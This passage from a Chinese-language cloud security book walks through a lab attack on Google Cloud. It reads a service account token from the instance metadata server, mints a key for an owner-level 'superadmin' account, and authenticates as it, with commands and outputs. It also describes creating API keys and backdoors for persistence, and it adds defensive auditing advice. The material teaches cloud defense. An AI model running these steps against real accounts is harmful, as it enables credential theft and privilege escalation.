
```
curl -H "Metadata-Flavor: Google" \
  "$MD_URL/instance/service-accounts/default/scopes"
```

这将返回以下输出：

```
https://www.googleapis.com/auth/cloud-platform
```

从实例元数据服务器检索 VM 默认服务账号的访问令牌：

```
curl -H "Metadata-Flavor: Google" \
  "$MD_URL/instance/service-accounts/default/token"
```

你应得到以下 JSON 响应：

```
{"access_token":"...","expires_in":...,"token_type":"Bearer"}
```

从上一步的 JSON 输出中复制 `access_token` 的值。

退出 SSH 会话：

```
exit
```

### 4. 将访问令牌的值存储在变量中：

```
SUPERADMIN_ACCESS_TOKEN="[ACCESS TOKEN]"
```

确保将 `[ACCESS TOKEN]` 替换为访问令牌。

### 5. 将服务账号的电子邮件地址（`superadmin@....iam.gserviceaccount.com`）存储在变量中：

```
SUPERADMIN_EMAIL="[EMAIL]"
```

确保将 `[EMAIL]` 替换为以 `superadmin` 开头的服务账号的电子邮件地址。

### 6. 生成新的服务账号密钥然后将其保存到本地：

```
cd ~

BASE_URL="https://iam.googleapis.com/v1"
PROJECT_PATH="projects/$PROJECT_ID"
SERVICE_ACCOUNT="serviceAccounts/$SUPERADMIN_EMAIL"

curl -s -X POST \
  -H "Authorization: Bearer $SUPERADMIN_ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  "$BASE_URL/$PROJECT_PATH/$SERVICE_ACCOUNT/keys" \
  -d '{}' \
  | jq -r '.privateKeyData' | base64 --decode > superadmin-key-02.json
```

#### Tip

你可以通过运行 `cat superadmin-key-02.json` 来验证 `superadmin-key-02.json` 是否存在。

### 7. 使用生成的密钥以关联 `roles/owner` 角色的服务账号身份进行身份验证：

```
export SUPERADMIN_CREDENTIALS="superadmin-key-02.json"

gcloud auth activate-service-account \
  --key-file=$SUPERADMIN_CREDENTIALS

PROJECT_ID=$(cat superadmin-key-02.json | jq -r ".project_id")
gcloud config set project $PROJECT_ID
```

### 8. 列出所有已通过身份验证的 `gcloud` 账号：

```
gcloud auth list
```

这会产生以下输出：

```
Credentialed Accounts

...

ACTIVE:
ACCOUNT: html-to-pdf@....iam.gserviceaccount.com

ACTIVE: *
ACCOUNT: superadmin@....iam.gserviceaccount.com

To set the active account, run:
    $ gcloud config set account `ACCOUNT`
```

这里，`superadmin@…​.iam.gserviceaccount.com` 账号当前处于活动状态，如 ACTIVE 列中的 `*` 所示。

### 9. 检查分配给服务账号的 IAM 角色，以验证其是否关联 `roles/owner` 角色：

```
gcloud projects get-iam-policy $PROJECT_ID \
  --flatten="bindings[].members" \
  --format='table(bindings.role)' \
  --filter="bindings.members:$SUPERADMIN_EMAIL"
```

这会输出以下内容：

```
ROLE: roles/owner
```

你现在应该对过度宽松的服务账号如何允许攻击者将权限提升超出其初始访问范围有了很好的了解。从这一点开始，攻击者可以对项目执行不受限制的操作，包括修改 IAM 策略、创建或删除资源、部署恶意工作负载、访问敏感数据，以及安装后门以在账号中保持长期持久性。

攻击者可以采取的另一条途径是创建新的 API 密钥——一个加密字符串，允许应用程序调用各种 Google Cloud API，例如 Cloud Translation API 和 Cloud Vision API——并使用它直接访问无服务器实验环境中启用的 Google Cloud 服务，如 [Figure 10-5](#ch10.html#ch10-generate-api-key-intro) 所示。

![](assets/lsse_1005.png)

成功生成或获取 API 密钥的攻击者可以直接在 rogue 项目中使用它进行未经授权的请求并与 Google Cloud 服务交互，而无需使用被入侵服务账号的凭据。要生成新的 API 密钥，攻击者可以以具有相关 `apikeys.keys.*` 权限的服务账号身份进行身份验证，例如由 `roles/​serv⁠iceusage.apiKey⁠s​Admin` 角色授予的权限。^[17](#ch10.html#id899) 由于 `superadmin@…​.iam.gserviceaccount.com` 服务账号已被授予 `roles/owner` 角色（该角色已包含 `apikeys.keys.*` 权限），攻击者可以在无需额外权限的情况下创建和管理 API 密钥。

从防御安全角度来看，主动检查具有提升权限的服务账号并将其使用限制为仅特定资源以限制攻击者通过服务账号提升权限的能力至关重要。你还必须主动审计每个项目中现有的 API 密钥，验证其权限，并撤销任何可疑或可能被入侵的密钥。^[18](#ch10.html#id900) 你应考虑使用自动化工具和服务来持续监控配置错误、检测未经授权的 API 密钥使用情况，并在所有服务账号和项目中强制执行最小权限访问。

#### Caution

现在你已完成本章和前两章中的动手示例，请务必检查并删除你在 Google Cloud 账号中创建的所有资源。留下不再使用的资源可能会导致不必要的费用，并使你的账号暴露于潜在的安全风险。

# Summary

在本章中，你深入了解了攻击者如何利用其初始访问权限设置后门、提升权限并入侵云账号中的其他资源。你首先通过设置较低的请求超时来限制攻击者在反向 shell 会话中运行恶意命令的时间窗口——但很快意识到仅此措施无法完全保护应用程序免受知道如何绕过此类限制的攻击者侵害。在完成包括设置后门在内的攻击模拟后，你进一步将易受攻击的 Cloud Run 服务的请求超时设置减少到 10 秒，并大幅减少了相关服务账号的权限。在无服务器实验环境中实施这些更改后，你模拟了攻击者如何通过避免使用反向 shell 来绕过新的超时和权限限制。最后，你探索了攻击者可以用来滥用配置错误并在 Google Cloud 账号中提升权限的多种策略和方法。

在下一章中，你将把重点转向 Microsoft Azure，并研究攻击者如何利用易受攻击的 Azure Functions。随着你进行模拟和动手示例，你将学习如何识别各种类型的配置错误并对其进行保护以抵御潜在威胁。

^[1](#ch10.html#id862-marker) 你可以 optionally 将输出粘贴到本地文本编辑器中。

^[2](#ch10.html#id868-marker) 你可以在 [GitHub gist (see `remove_iam_policy_binding.sh`)](https://oreil.ly/0mSPU) 中找到此脚本。请注意，你可能需要浏览页面才能找到它。

^[3](#ch10.html#id873-marker) 这假设 `ngrok` 已在你的本地机器上安装并完全配置（例如，你的 `ngrok` authtoken 已设置，并且你有权限打开隧道）。如果没有，请在运行隧道之前按照官方 `ngrok` 设置说明进行操作。

^[4](#ch10.html#id877-marker) 如果 `INPUT_BUCKET` 变量已设置，可以跳过此步骤。

^[5](#ch10.html#id878-marker) 如果 `NGROK_URL` 变量已设置，可以跳过此步骤。

^[6](#ch10.html#id879-marker) 由于你的 `ngrok` URL 不同，预计会得到不同的编码字符串输出。

